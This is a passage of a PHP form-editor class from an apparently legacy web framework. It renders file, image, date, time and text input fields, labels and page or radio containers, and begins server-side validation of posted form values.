          $cell->add(new edit(array( "id"          => $context_control_name
                                   , "template_id" => $control_name
                                   , "value"       => $value
                                   , "class"       => "ipv4"
                                   , "maxlength"   => 15
                                   )));
        break;
      case "file":
        $current_value = null;
        if ($field_value)
          if (safe($field, "file_name_field"))
            $current_value = safe($this->row, $field["file_name_field"]);
          else
            $current_value = $field_value;

        $attributes = array();
        if (safe($field, "post_on_change"))
          $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
  
        if ($this->is_field_read_only($field)) {
          $cell->add(new html_div($current_value, array("class" => "read_only")));
        } else 
        if (!$this->insert()) {
          $cell->add(new hidden($context_control_name.__HTML_CONTROL_NAME_SEPARATOR."current", $field_value));
          if ($field_value) {
            switch(safe($field, 'storage_mode')) {
              case "optimal":                                
                $folder = optimal_file_storage_path(safe($field, "url"), $this->table, $this->key(), safe($field, 'optimal_storage_field_name', $field['name']));
                break;
              default:
                if (safe($field, 'auto_folder'))
                  $folder = safe($field, "url").$this->table.'/'.$this->key().'/';
                else
                  $folder = safe($field, "url");
                break;
            }
            $file_url = $folder.$field_value;  
            $cell->add( new table( array("class" => "edt_file")
                                 , new table_row( new table_cell( new text(trn("Current")), array("class" => "file_label"))
                                                , new table_cell( new href($file_url, for_html($current_value), array("target" => "blank_"))
                                                                , array("nowrap" => true))
                                                , (safe($field, 'required')?null:new table_cell( new javascript_image_href($this->js_post_back("edt_clear_field", $field_name), SHARED_RESOURCES_URL."img_clear.gif")))
                                                , (safe($field, 'required')?null:new table_cell( new javascript_href($this->js_post_back("edt_clear_field", $field_name), trn("Clear"))))
                                                , new table_cell( array('width' => '100%') )
                                                )
                                 , new table_row( new table_cell( new text(trn("New")), array( "class"           => "file_label" ))
                                                , new table_cell( new file_picker(null, array( "id"              => $context_control_name
                                                                                             , "template_id"     => $control_name
                                                                                             , "template_object" => $this->template_object()
                                                                                             , "class"           => "file"
                                                                                             ) + $attributes)
                                                                , array( "class"   => "file_value"
                                                                       , "colspan" => 4
                                                                       )))));
          } else {
            $cell->add(new file_picker(null, array( "id"              => $context_control_name
                                                  , "template_id"     => $control_name
                                                  , "template_object" => $this->template_object()
                                                  , "class"           => "file"
                                                  ) + $attributes));
          }
        } else {
          $cell->add(new file_picker(null, array( "id"              => $context_control_name
                                                , "template_id"     => $control_name
                                                , "template_object" => $this->template_object()
                                                , "class"           => "file"
                                                ) + $attributes));
        }
        break;
      case "image":
        $image_attributes = array();
        if ($field_value) {        
          if (safe($field, "image_width"))
            $image_attributes["width"] = safe($field, "image_width");
          if (safe($field, "image_height"))
            $image_attributes["height"] = safe($field, "image_height");
          if (!safe($field, "image_width") and !safe($field, "image_height")) {
            require_once(dirname(dirname(__FILE__))."/utils/image_file.php");
            $image_file = new image_file(safe($field, "folder").$field_value); 
            if ($image_file->valid) {   
              if ($image_file->width() > safe($field, "max_image_width", EDITOR_MAX_IMAGE_WIDTH)) {
                $image_attributes["width"]  = safe($field, "max_image_width", EDITOR_MAX_IMAGE_WIDTH);
                $image_attributes["height"] = round($image_file->height() * ($image_attributes["width"] * 100 / $image_file->width()) / 100);
              } 
            }                                 
          }
        }
        if ($this->is_field_read_only($field)) {
          if ($field_value) {
            switch(safe($field, 'storage_mode')) {
              case "optimal":                                
                $folder = optimal_file_storage_path(safe($field, "url"), $this->table, $this->key(), safe($field, 'optimal_storage_field_name', $field['name']));
                break;
              default:
                if (safe($field, 'auto_folder'))
                  $folder = safe($field, "url").$this->table.'/'.$this->key().'/';
                else
                  $folder = safe($field, "url");
                break;  
            }  
            $file_url = $folder.$field_value;
            $cell->add(new image_href( $file_url
                                     , $file_url
                                     , array("target" => "_blank")
                                     , $image_attributes 
                                     ));
          }                                   
        } else {
          $file_picker_attributes = array( "id"    => $context_control_name
                                         , "template_id"     => $control_name
                                         , "class" => "file"
                                         );
          if (safe($field, "disabled")) {
            $file_picker_attributes["readonly"] = true;
            $file_picker_attributes["tabindex"] = 9999;
          }           
          if (!$this->insert()) {
            $cell->add(new hidden($context_control_name.__HTML_CONTROL_NAME_SEPARATOR."current", $field_value));
            if ($field_value) {
              switch(safe($field, 'storage_mode')) {
                case "optimal":                                
                  $folder = optimal_file_storage_path(safe($field, "url"), $this->table, $this->key(), safe($field, 'optimal_storage_field_name', $field['name']));
                  break;
                default:
                  if (safe($field, 'auto_folder'))
                    $folder = safe($field, "url").$this->table.'/'.$this->key().'/';
                  else
                    $folder = safe($field, "url");
                  break;
              }
              $file_url = $folder.$field_value;  
              $cell->add(new table( array("class" => "edt_file")
                                  , new table_row( new table_cell( new text(trn("Current")), array("class" => "file_label"))
                                                 , (safe($field, 'required')?null:new table_cell( new javascript_image_href($this->js_post_back("edt_clear_field", $field_name), SHARED_RESOURCES_URL."img_clear.gif")))
                                                 , (safe($field, 'required')?null:new table_cell( new javascript_href($this->js_post_back("edt_clear_field", $field_name), trn("Clear"))))
                                                 , new table_cell( array("width" => "100%") )
                                                 )
                                  , new table_row( new table_cell( new image_href( $file_url
                                                                                 , $file_url
                                                                                 , array("target" => "_blank")
                                                                                 , $image_attributes 
                                                                                 )
                                                                 , array("class" => "file_value", "colspan" => 4))
                                                 )
                                  , new table_row( new table_cell( new text(trn("New")), array("class" => "file_label"))
                                                 , new table_cell( new file_picker(null, $file_picker_attributes)
                                                                 , array("class" => "file_value", "colspan" => 3)))
                                  ));
            } else {
              $cell->add(new file_picker(null, $file_picker_attributes));
            }
          } else {
            $cell->add(new file_picker(null, $file_picker_attributes));
          }
        }
        break;        
      default:    
        switch ($data_type) {
          case "int":
          case "real":
            if ($this->is_field_read_only($field))
              $cell->add(new html_div($value, array( "class" => "read_only")));
            else {
              $attributes = array ( "id"    => $context_control_name
                                  , "template_id"     => $control_name
                                  , "value" => $value
                                  , "class" => "int"
                                  );
              if (safe($field, "post_on_change"))
                $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
              if (safe($field, "on_change"))
                $attributes["onchange"] = safe($field, "on_change");
              if (safe($field, "max_length")) 
                $attributes["maxlength"] = $field["max_length"];  
              if (safe($field, "width"))
                $attributes["style"] = "width:".$field["width"]."px;";
              if (safe($field, "style"))
                $attributes["style"] = $field["style"];
              if (safe($field, "disabled")) {
                $attributes["readonly"] = true;
                $attributes["tabindex"] = 9999;
              }           
              if (safe($field, 'enabled_if_checked')) { 
                if (!$this->get_current_value(safe($field, 'enabled_if_checked'))) {
                  $attributes["disabled"] = true;
                }
              }
              if (safe($field, 'enabled_if_not_checked')) { 
                if ($this->get_current_value(safe($field, 'enabled_if_not_checked'))) {
                  $attributes["disabled"] = true;
                }
              }
              if ($read_only)  
                $attributes["disabled"] = true;
              if (safe($field, "on_keyup"))
                $attributes["onkeyup"] = safe($field, "on_keyup");
              $cell->add(new edit($attributes));
            }
            break;
          case "date":
            if ($value) {
              $display_value  = strftime_(safe($field, "date_format", DISPLAY_DATE_FORMAT), str_to_date($value));
              $internal_value = $value;
            } else {
              $display_value = " ";  
              $internal_value = "";  
            } 

            if ($this->is_field_read_only($field)) 
              $cell->add(new html_div($display_value, array( "class" => "read_only")));
            else {
              $sync_with = safe($field, "sync_with");
              $sync_when = safe($field, "sync_when", 'non_equal');
              if ($sync_with) {
                $sync_inputs = array();
                $sync_displays = array(); 
                foreach($sync_with as $control) {
                  $sync_inputs[]   = $this->context_id($control);
                  $sync_displays[] = $this->context_id($control).__HTML_CONTROL_NAME_SEPARATOR."v";
                }
              } else {
                $sync_inputs = null;
                $sync_displays = null; 
              }
              
              if ($this->template_mode)
                $display_control = new html_div($display_value, array( "id"    => $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."v"
                                                                     , "template_id" => $control_name.__HTML_CONTROL_NAME_SEPARATOR."v"
                                                                     , "style" => "width: 120px;border: 1px solid #aaa;float: left;padding: 2px 2px;height: 14px;text-align: center;"));
              else                                                       
                $display_control = new html_div($display_value, array( "id"    => $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."v"
                                                                     , "class" => "date"
                                                                     ));
                                                                     
              $date_attributes = array( "input_field"       => $context_control_name
                                      , "display_area"      => (safe($field, 'date_editable')?null:$context_control_name.__HTML_CONTROL_NAME_SEPARATOR."v")
                                      , "display_format"    => (safe($field, 'date_editable')?null:safe($field, "date_format", DISPLAY_DATE_FORMAT))
                                      , "save_format"       => INTERNAL_DATE_FORMAT
                                      , "sync_inputs"       => $sync_inputs
                                      , "sync_displays"     => $sync_displays
                                      , "sync_when"         => $sync_when
                                      , "show_clear_button" => !safe($field, "required")
                                      );
              
              if (safe($field, "post_on_change"))
                $date_attributes["on_change"] = $this->js_post_back("edt_ui_change", $control_name);
                                                       
              $table_attributes = array( "cellpadding" => 0
                                       , "cellspacing" => 0
                                       ); 
              if (safe($field, 'date_box_style'))
                $table_attributes['style'] = $field['date_box_style'];
              if (safe($field, 'date_box_class'))
                $table_attributes['class'] = $field['date_box_class'];
              $table = new table( $table_attributes
                                , new table_row(
                                     new table_cell( (safe($field, 'date_editable')?new edit(array( 'id'          => $context_control_name
                                                                                                  , 'template_id' => $control_name
                                                                                                  , 'value'       => $internal_value
                                                                                                  , 'class'       => 'date'))
                                                                                   :new hidden($context_control_name, $internal_value, array('template_id' => $control_name)))
                                                   , (safe($field, 'date_editable')?null:$display_control)
                                                   )
                                   , new table_cell("&nbsp;")
                                   , new table_cell( new date_picker($date_attributes))));
              if ($this->template_mode) {
                $table->set_template_id($control_name);
                $table->is_tree_templateable = true;
              }
              $cell->add($table);
            }
            break;
          case "time":
            if ($value) {
              $value = correct_war_time($value);
              $value = strftime_(safe($field, "time_format", DISPLAY_TIME_FORMAT), $db->from_time($value));
            }

            if ($this->is_field_read_only($field)) 
              $cell->add(new html_div($value, array( "class" => "read_only")));
            else {
              $attributes = array( "id"          => $context_control_name
                                 , "template_id" => $control_name
                                 , "value"       => $value
                                 , "class"       => "time"
                                 , "maxlength"   => 5
                                 );
              if ($read_only)  
                $attributes["disabled"] = true;
              $cell->add(new edit($attributes));
            }
            break;
          case "date_time":
            if ($value) {
              $display_value = strftime_(safe($field, "date_format", DISPLAY_DATE_FORMAT), str_to_date($value));
              $internal_value = $value;
            } else {
              $display_value = " ";
              $internal_value = "";  
            }

            if ($this->is_field_read_only($field)) {
              if ($display_value and $time_value) 
                $cell->add(new html_div(sprintf(trn('%s at %s'), $display_value, $time_value), array( "class" => "read_only")));
              else  
              if ($display_value) 
                $cell->add(new html_div($display_value, array( "class" => "read_only")));
              else  
              if ($time_value) 
                $cell->add(new html_div(sprintf(trn('at %s'), $time_value), array( "class" => "read_only")));
            } else {
              $time_attributes = array( "id"          => $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."time"
                                      , "template_id" => $control_name.__HTML_CONTROL_NAME_SEPARATOR."time"
                                      , "value"       => $time_value
                                      , "class"       => "time"
                                      );
              if ($read_only)  
                $time_attributes["disabled"] = true;
              $cell->add(
                new table(array("cellspacing" => 0, "cellpadding" => 0)
                , new table_row(
                    new table_cell( new hidden($context_control_name, $internal_value, array('template_id' => $control_name))
                                  , new html_div($display_value, array( "id"          => $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."v"
                                                                      , "template_id" => $control_name.__HTML_CONTROL_NAME_SEPARATOR."v"
                                                                      , "class"       => "date"
                                                                      )))
                  , new table_cell(' ')
                  , new table_cell(new date_picker( array( "input_field"       => $context_control_name
                                                         , "display_area"      => $context_control_name.__HTML_CONTROL_NAME_SEPARATOR."v"
                                                         , "display_format"    => safe($field, "date_format", DISPLAY_DATE_FORMAT)
                                                         , "save_format"       => INTERNAL_DATE_FORMAT
                                                         , "sync_with"         => safe($field, "sync_with")
                                                         , "show_clear_button" => !safe($field, "required")
                                                         )))
                  , new table_cell(trn('&nbsp;at&nbsp;'))
                  , new table_cell(new edit($time_attributes)))));
            }
            break;
          default: 
            if ($this->is_field_read_only($field)) {
              if ($type == "url")
                $cell->add(new html_div( new href($value, $value, array("target" => "_blank"))
                                       , array( "class" => "read_only")
                                       ));
              else
                $cell->add(new html_div( for_html($value)
                                       , array( "class" => "read_only"
                                              , "template_id" => $control_name
                                              , "template_object" => $this->template_object()
                                              )
                                       ));
            } else {
              $attributes = array( "id"              => $context_control_name
                                 , "template_id"     => $control_name
                                 , 'template_object' => $this->template_object()
                                 , "value"           => $value
                                 , "class"           => safe($field, "class", ($sub_container?"text_embedded":"text"))
                                 ); 
              if (safe($field, "width"))
                $attributes["style"] = "width:".$field["width"]."px;";
              if (safe($field, "style"))
                $attributes["style"] = $field["style"];
              if (safe($field, "max_length")) {
                $attributes["maxlength"] = $field["max_length"];  
              } else 
              if (safe(safe($defs, $field["name"]), "length"))
                $attributes["maxlength"] = $defs[$field_name]["length"];
              if (safe($field, "uppercase"))
                $attributes["style"] = "text-transform: uppercase;";
              if (safe($field, "post_on_exit"))
                $attributes["onblur"] = "if (this.value != '$value') ".$this->js_post_back("edt_on_exit", $context_control_name);
              if (safe($field, "post_on_change"))
                $attributes["onchange"] = $this->js_post_back("edt_ui_change", $control_name);
              if ($read_only)  
                $attributes["disabled"] = true;
              if (safe($field, 'enabled_if_checked')) {
                if (!$this->get_current_value(safe($field, 'enabled_if_checked'))){
                  $attributes["disabled"] = true;
                }
              }
              if (safe($field, 'enabled_if_not_checked')) {
                if ($this->get_current_value(safe($field, 'enabled_if_not_checked')))
                  $attributes["disabled"] = true;
              }
                  
              if (safe($field, "prefix_text"))
                $cell->add(new text($field["prefix_text"]));
                
              $cell->add(new edit($attributes));
            }
            break;
        }
    }

  }
  
  function render_field_label($label_container, $field, $label = null) {
    
    $control_name = safe($field, "control");
    if ($control_name)
      $context_control_name = $this->context_id($control_name);
    if ($label !== null)
      $field_label = trn($label);
    else  
      $field_label = trn(safe($field, "label"));
    $type = safe($field, "type"); 

    $required = safe($field, "required") and (!$this->is_field_read_only($field)) and ($label !== "");
    if (in_array($control_name, $this->error_controls)) {
      if ($required)
        $container = new html_span(array("class" => "required_error"));
      else  
        $container = new html_span(array("class" => "error"));
    } else  
    if ($required)
      $container = new html_span(array("class" => "required"));
    else  
      $container = new container();
    if (($type == "url") and !safe($field, "dont_link") and !$this->is_field_read_only($field))
      $container->add(new href( 'javascript:;'
                              , $field_label
                              , array( 'title'   => 'Open entered URL in new window'
                                     , 'target'  => '_blank'
                                     , 'onclick' => "__SetUrlFrom('".$context_control_name."', this);"
                                     )));
    else
    if ($control_name)
      $container->add(new label($field_label, array("for" => $context_control_name)));
    else  
      $container->add(new label($field_label));
    
    $label_container->add($container);
    
    /*
    if (safe($field, "required") and (!$this->is_field_read_only($field)))
      if ($label !== "")
        $label_container->add(new html_em("&nbsp;*"));
    */    
    if (safe($field, "label_description")) {
      $label_container->add(new html_br());
      $label_container->add(new html_small(for_html($field["label_description"]), array("class" => "description")));
    }
    
  }
  
  function render_container($parent_control, $container, $sub_container = false, $read_only = false, $render_all_labels = false) {

    /* init */
    if ($this->visible("pages") and !$sub_container) {
      $page_control = new page_control(array( 'active_page'        => $this->setting('page_control_0_active_page')
                                                , 'active_page_holder' => $this->context_id('page_control_0_active_page')
                                                , 'is_in_popup'        => get(URL_PARAM_POPUP_WINDOW)
                                            ));
                                           
      if (!$this->main_page_save_active_page) {
        $this->set_setting('page_control_0_active_page', null);
      }  
      
      $page_control->width = $this->width;

      $__main_page_control = $page_control;

      $page = new page(trn($this->main_page_title));
    }

    if (!$sub_container) {
      $main_table     = new table(array( "cellspacing" => 1
                                       , "class"       => "edt_columns_container"
                                       ));
      $main_table_row = new table_row(array("valign" => "top"));
        
      $current_table = new table(array( "cellspacing" => 1
                                      , "class"       => "edt_controls_container"
                                      ));
    } else {
      $current_table = new table(array( "cellspacing" => 1
                                      , "class"       => "edt_controls_sub_container"
                                      ));
      $current_row  = new table_row();
    }
    /* init */  
    
    // means we are rendering first container controls so don't need to draw label for sub container controls
    $first_control_in_container = true;
    
    if ($container->controls) {
      foreach ($container->controls as $control) {

        $type = safe($control, "type"); 

        switch ($type) {
          case "page_control":
            $main_table_row->add(new table_cell($current_table));
            
            $main_table_row->set_proportional_widths();
            $main_table->add($main_table_row);
            
            if ($this->visible("pages")) {
              $page->add($main_table);
            
              $page_control->add_page($page);
            
              $parent_control->add($page_control);
            } else {
              $parent_control->add($main_table);
            }
            
            $this->__in_page_control = true;
            $this->__in_page_control_pages_visible = safe($control, 'pages_visible');
            
            if (($this->__in_page_control and $this->__in_page_control_pages_visible) or (!$this->__in_page_control and $this->visible("pages"))) {
              $page_control = new page_control(array( 'active_page'        => safe($control, 'active_page')
                                                          , 'active_page_holder' => $this->context_id('page_control_'.$control["index"].'_active_page')
                                                        , 'is_in_popup'        => get(URL_PARAM_POPUP_WINDOW)
                                                                            ));
              $page_control->width = $this->width;

              $page = new page(safe($control, 'main_page_title', trn('General')));
            }

            $main_table     = new table(array( "cellspacing" => 1
                                             , "class"       => "edt_columns_container"
                                             ));
            //$main_table_row = new table_row();
            $main_table_row = new table_row(array("valign" => "top"));

            $current_table = new table(array( "cellspacing" => 1
                                            , "class"       => "edt_controls_container"
                                            ));
            break;  
          case "page":
            $main_table_row->add(new table_cell($current_table));
            
            $main_table_row->set_proportional_widths();
            $main_table->add($main_table_row);
            
            $page->add($main_table);
            
            $page_control->add_page($page);

            $page = new page(trn(safe($control, "title")));

            $main_table     = new table(array( "cellspacing" => 1
                                             , "class"       => "edt_columns_container"
                                             ));
            //$main_table_row = new table_row();
            $main_table_row = new table_row(array("valign" => "top"));

            $current_table = new table(array( "cellspacing" => 1
                                            , "class"       => "edt_controls_container"
                                            ));
            break;
          case "column":
            $main_table_row->add(new table_cell($current_table));

            $current_table = new table(array( "cellspacing" => 1
                                            , "class"       => "edt_controls_container"
                                            ));
            break;
          case "separator":
            $current_table->add(new table_row(new table_cell(array( "colspan" => 2
                                                                  , "class"   => "separator")
                                                            , trn($control["title"])
                                                            )));
            break;
          case "row":
            $current_table->add(new table_row(new table_cell( array( "colspan" => 2
                                                                   , "class"   => "row")
                                                            , $control["value"]
                                                            )));
            break;
          case "control":
            if ($sub_container) {
              $current_row->add(new table_cell($control["control"]));
            } else {
              $current_table->add(new table_row(new table_cell($control["control"], array("colspan" => 2))));
            }
            break;
          case "container":
            $current_row  = new table_row();
            //$current_row  = new table_row(array('valign' => 'top'));
            $current_cell = new table_cell(array("class" => "label"));
            
            $label_field = null;
            $label_rendered = false;
            foreach ($control["value"]->controls as $container_control) {
              if ($container_control["type"] == "field") {
                $label_field = $container_control["field"];
                $this->render_field_label(&$current_cell, $label_field, $control["label"]);
                $label_rendered = true;
                break;
              }
            }
            if (!$label_rendered)
              $this->render_field_label(&$current_cell, '', $control["label"]);
            if ($label_field and safe($label_field, 'label_class'))
              $current_cell->set_attribute('class', $label_field['label_class']);

            $current_row->add($current_cell);

            if (!$sub_container)
              $current_cell = new table_cell(array( "class" => "value"));
            else
              $current_cell = new table_cell();
            
            $this->render_container(&$current_cell, $control["value"], true);
            
            if ($this->visible("pages") and !$sub_container and !$this->read_only) {
               if ($control["value"]->contain_field_control($this->active_control))    
                 $page_control->select_current_page();
               else
               if ($control["value"]->contain_field_control($this->active_control_candidate)) {
                 if (!$page_control->current_selected_page()) {
                   $this->active_control = $this->active_control_candidate;
                   $page_control->select_current_page();
                 }
               } else
               if ($control["value"]->contain_field_control($this->active_control_last_candidate)) {
                 if ($page_control->pages_count())
                   $this->active_control_last_candidate = null;
               }
            }
            
            $current_row->add($current_cell);
            
            $current_table->add($current_row);
            
            break;
          case "radio_container":
            if ($sub_container) {
//              $current_table->add($current_row);  
//              $current_row  = new table_row();
//              $parent_control->add($current_table);
//              $attributes = $current_table->__attributes;
//              $current_table = new table();
//              $current_table->__attributes = $attributes;
//              $current_row  = new table_row();
            } else
              $current_row  = new table_row();

            $control_name = null;
            $context_control_name = null;
            if ($field = safe($control, "field")) {
              $field_name   = $field['name'];  
              $table_name   = safe($field, 'table', $this->table);  
              $control_name = $field['control'];
              $context_control_name = $this->context_id($control_name);
              $posted_value         = post($context_control_name);
              $default_value        = null;
              if ($this->virtual)
                $default_value      = $this->get_stored_value($field_name);
              if (!$default_value)
                $default_value      = safe($this->defaults, $field_name, safe($field, "default"));

              if (!$this->insert()) {
                if (safe($field, "virtual")) {
                  $field_value = safe($field, "value");
                  if (!$field_value)
                    $field_value = $this->do_fill_field($field_name);
                } else
                if (array_key_exists($field_name, $this->data_rows[$table_name])) {
                  $field_value = $this->data_rows[$table_name][$field_name];
                } else 
                  critical_error("Field $field_name not found");
              }
              if ($this->initial()) { 
                if ($this->insert()) {   
                  $value = $posted_value;
                  if (!$value)
                    $value = $default_value;
                } else {
                  $value = $field_value;
                  if (!strlen($value)) {
                    $value = $posted_value;
                  }
                }
              } else {
                if ($this->is_field_read_only($field))
                  $value = $field_value;
                else  
                  $value = $posted_value;
              }
            } else {
              global $__control_id;
              $__control_id++;
              $control_name = 'rc'.__HTML_CONTROL_NAME_SEPARATOR.$__control_id;
              $context_control_name = $this->context_id($control_name);
            }

            if (!safe($control, 'hide_label')) {
              $current_cell = new table_cell(array( "class"  => "label"
                                                  , 'valign' => 'top'
                                                  ));
              $this->render_field_label(&$current_cell, $field, $control["label"]);
              $current_row->add($current_cell);
              $current_cell = new table_cell(array( "class" => "value"));
            } else
              $current_cell = new table_cell(array( "class"   => "value"
                                                  , 'colspan' => 2));

            $radio_table = new table(array( 'cellpadding' => 0
                                          , 'cellspacing' => 1
                                          ));

            $idx = 0;
            foreach ($control["value"]->controls as $container_control) {
              if ($container_control["type"] == "radio_item") {
                $radio_table_row = new table_row(array('valign'  => 'top'));

                $radio_table_cell = new table_cell(array('style' => 'padding-top:4px;' ));
                $idx++;
                $row_value = safe($container_control, 'field_value', $idx);
                if ($field)
                  $checked = ($row_value == $value);
                else
                  $checked = safe($container_control, 'checked');

                if ($this->read_only) {
                  if ($checked) {
                    $radio_table_cell->add(new html_div($container_control['label'], array( "class" => "read_only")));
                    $radio_table_row->add($radio_table_cell);

                    $radio_table_cell = new table_cell();
                    $this->render_container(&$radio_table_cell, $container_control["value"], true, !$checked);
                    $radio_table_row->add($radio_table_cell);

                    $radio_table->add($radio_table_row);
                  }
                } else {  
                  $attributes = array();
                  $attributes['id']          = $context_control_name.'['.$row_value.']';
                  $attributes['template_id'] = $control_name.'['.$row_value.']';
                  $attributes['name']        = $context_control_name;
                  $attributes['value']       = $row_value;
                  if ($checked)
                    $attributes['checked'] = true;
                  $attributes['onclick'] = '__EnableRadioContainer(this);';
                  $radio_table_cell->add(new radio_label($container_control['label'], $attributes));
                  $radio_table_row->add($radio_table_cell);

                  $radio_table_cell = new table_cell();
                  $this->render_container(&$radio_table_cell, $container_control["value"], true, !$checked, true);
                  $radio_table_row->add($radio_table_cell);

                  $radio_table->add($radio_table_row);
                }
              }
            }

            $current_cell->add($radio_table);

            if ($this->visible("pages") and !$sub_container and !$this->read_only) {
               if ($control["value"]->contain_field_control($this->active_control))
                 $page_control->select_current_page();
               else
               if ($control["value"]->contain_field_control($this->active_control_candidate)) {
                 if (!$page_control->current_selected_page()) {
                   $this->active_control = $this->active_control_candidate;
                   $page_control->select_current_page();
                 }
               } else
               if ($control["value"]->contain_field_control($this->active_control_last_candidate)) {
                 if ($page_control->pages_count())
                   $this->active_control_last_candidate = null;
               }
            }

            $current_row->add($current_cell);

            if (!$sub_container)
              $current_table->add($current_row);

            break;
          case "line_break":
            if ($sub_container) {
              $current_table->add($current_row);  
              $current_row  = new table_row();
              $parent_control->add($current_table);
              $attributes = $current_table->__attributes;
              $current_table = new table();
              $current_table->__attributes = $attributes;
              $current_row  = new table_row();
            }
            break;
          case "field":
            $field     = $control["field"];
            $field_tag = (safe($control["field"], 'table')?safe($rol["field"], 'table').'_':'').$control["field"]["name"];
            $field['dependent_controls_enable']  = safe($this->fields[$field_tag], 'dependent_controls_enable');
            $field['dependent_controls_disable'] = safe($this->fields[$field_tag], 'dependent_controls_disable');
            $field['dependent_controls_visible'] = safe($this->fields[$field_tag], 'dependent_controls_visible');

            $control_name         = $field["control"];
            $context_control_name = $this->context_id($control_name);
            $type                 = safe($field, "type"); 

            if ($this->is_field_visible($field)) {
              
              if (!$sub_container) {
                if (($type == "memo") or ($type == "check_list") or ($type == "lookup_list") or ($type == "list") or ($type == "captcha") or (safe($field, 'value_description')))
                  //$current_row  = new table_row();
                  $current_row  = new table_row(array("valign" => "top"));
                else  
                  $current_row  = new table_row();

                if (!safe($field, "hide_label")) {
                  $attributes = array("class" => "label");
                  if (safe($field, 'label_style'))
                    $attributes['style'] = safe($field, 'label_style');
                  $current_cell = new table_cell($attributes);
                  $this->render_field_label(&$current_cell, $field);
                  $current_row->add($current_cell);
                  $current_cell = new table_cell(array( "class" => "value", "valign" => "top" ));
                } else
                  $current_cell = new table_cell(array( "class" => "value", "valign" => "top", "colspan" => 2 ));
              } else {
                if (!safe($field, "hide_label") and $sub_container and (!$first_control_in_container or $render_all_labels)) {
                  $current_cell = new table_cell();
                  $attributes = array("class" => "label");
                  if (safe($field, 'label_style'))
                    $attributes['style'] = safe($field, 'label_style');
                  $this->render_field_label(&$current_cell, $field);
                  $current_row->add($current_cell);
                }

                $current_cell = new table_cell(array( "valign" => "top"));
                
                if ($first_control_in_container)
                  $first_control_in_container = false;
  
              }

              $this->render_field(&$current_cell, $field, $read_only, $sub_container);

              if ($this->visible("pages") and !$sub_container and !$this->read_only) {
                 if ($control_name == $this->active_control)
                   $page_control->select_current_page();
                 else
                 if ($control_name == $this->active_control_candidate) {
                   if (!$page_control->current_selected_page()) {
                     $this->active_control = $this->active_control_candidate;
                     $page_control->select_current_page();
                   }
                 } else
                 if ($control_name == $this->active_control_last_candidate) {
                   if ($page_control->pages_count())
                     $this->active_control_last_candidate = null;
                 }
              }

              if (!$sub_container) {
                if (safe($field, "value_description")) {
                  $current_cell->add(new html_br());
                  $current_cell->add(new html_small($field["value_description"], array("class" => "description")));
                }
              }
              
              $this->do_before_finalyze_cell(&$current_cell, $control_name);
              
              $current_row->add($current_cell);

              if (!$sub_container) 
                $current_table->add($current_row);
            } else {
              $this->render_field(&$this, $field, false, $sub_container);
            }
            break;
        }
      }
    }

    if (!$sub_container) {  
      $main_table_row->add(new table_cell($current_table));
      
      $main_table_row->set_proportional_widths();
      $main_table->add($main_table_row);
      

      if (($this->__in_page_control and $this->__in_page_control_pages_visible) or (!$this->__in_page_control and $this->visible("pages"))) {      
        $page->add($main_table);
        
        $page_control->add_page($page);
        
        $parent_control->add($page_control);
        
      } else {
        $parent_control->add($main_table);
        
      }
    } else {
      $current_table->add($current_row);
      
      $parent_control->add($current_table);
      
    }
    
  }

  function get_record_name() {
    
    if (!$this->row)
      if ($this->key()) {
        global $db;
        $this->row = $db->row("SELECT * FROM ".$this->table." WHERE ".$this->key_field." = ?", $this->key());
      }
    if ($this->row)
      return safe($this->row, 'name', safe($this->row, 'code', safe($this->row, 'document_no')));
      
  }
  
  function render_editor() {

    global $dm;
    global $ui;
    global $browsing_history;
    
    if ($this->capable('update_edits_history') and !$this->insert()) {
      if ($description = $this->get_record_name())
        $browsing_history->register($this->title, $description);
    }
    
    $defs = array();  
    if (!$this->virtual)
      $defs = $dm->fields($this->table);
    $this->do_before_draw_body($this->row);
    $this->render_container(&$this, $this->container);
  }

  function check_post() {

    global $db;
    global $dm;

    $defs = array();
    if (!$this->virtual) {
      $dm->table($this->table, "key_field", $this->key_field);
      $defs = $dm->fields($this->table);
    }
    
    foreach($this->fields as $field) {
      
      $relevant = true;
      $control_name = null;
      
      if (safe($field, 'linked_to_field')) {
        $linked_field = $field['linked_to_field'];
        $linked_field_value = post($this->context_id($linked_field['control']));
        if (array_key_exists($linked_field_value, $field['linked_values'])) {
          $relevant = true;
          $control_name = $field['linked_values'][$linked_field_value];
        } else {
          $relevant = false;
        }
      }
      
      if ($relevant and !$this->is_field_read_only($field) and ($this->is_field($field) or $this->is_field_link($field))) {

        $field_name           = $field["name"];
        if (!$control_name)
          $control_name       = $field["control"];
        $context_control_name = $this->context_id($control_name);
        $field_caption        = trn(safe($field, "display_name"));
        $type                 = safe($field, "type"); 
        $data_type            = safe($field, 'data_type', safe(safe($defs, $field_name), 'type', 'text'));
        $is_disabled          = false;

        if (safe($field, 'enabled_if_checked')) {
          if (!$this->get_current_value(safe($field, 'enabled_if_checked')))
            $is_disabled = true;
        }
        if (safe($field, 'enabled_if_not_checked')) {
          if ($this->get_current_value(safe($field, 'enabled_if_not_checked')))
            $is_disabled = true;
        }
        
        switch ($type) {
          case "checkbox":
            if (post($context_control_name) == "on")
              set_post($context_control_name, 1);
            else  
              set_post($context_control_name, 0);
            break;
          case "url":  
            $value = post($context_control_name);
            if (!preg_match('/^http[s]*:\/\//i', $value) and !preg_match('/^ftp[s]*:\/\//i', $value) and $value)
              set_post($context_control_name, 'http://'.$value);
            break;  
        }
        
        if (safe($field, 'unique_check')) {
          $value = post($context_control_name);
          if ($db->value($field['unique_check'], $value)) {
             $this->errors[]         = sprintf(trn("%s must be unique"), $field_caption);
             $this->error_controls[] = $control_name;
          }
        }

        if (safe($field, "required") && !$is_disabled) {

          $err_msg_field_required = sprintf(trn("%s cannot be empty"), $field_caption);
          
          switch ($type) {
            case "file":
            case "image":
              $value = post($context_control_name.__HTML_CONTROL_NAME_SEPARATOR."current");
              if ((count($_FILES) > 0) and file_exists($_FILES[$context_control_name]["tmp_name"]))
                $value = $_FILES[$context_control_name]["name"];
              if ($value == "") {
                $this->errors[]         = $err_msg_field_required;
                $this->error_controls[] = $control_name;
              } 
              break;
            case "set":
            case "check_list":  
              if (!is_array(post($context_control_name)) or !count(post($context_control_name))) {
                $this->errors[]         = $err_msg_field_required;
                $this->error_controls[] = $control_name;
              }
              break;
            case "checkbox":  
              if (!post($context_control_name)) {
